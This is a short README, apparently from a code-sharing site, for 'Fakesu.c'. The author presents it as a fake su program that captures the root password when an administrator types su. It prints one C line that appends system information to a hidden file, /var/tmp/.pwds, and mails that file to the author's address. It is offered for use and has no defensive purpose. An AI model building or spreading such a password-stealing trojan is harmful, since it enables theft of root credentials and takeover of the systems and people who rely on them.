Fakesu.c
==============

Abstract
--------------
This is my SU password recorder which will 
automatically capture SU password when root type 
su.

My little 'feature'
-------------------------
Auto send password file to your email :P

'''c
system("uname  -a >> /var/tmp/.pwds;  cat /var/tmp/.pwds | mail <your@email>")
'''

- Zypeh 

<hr>

[![endorse] (http://api.coderwall.com/zypeh/endorsecount.png)] (http://coderwall.com/zypeh)

[![Facebook] (http://bit.ly/VTsPK4)] (http://www.facebook.com/lisper.zypeh)
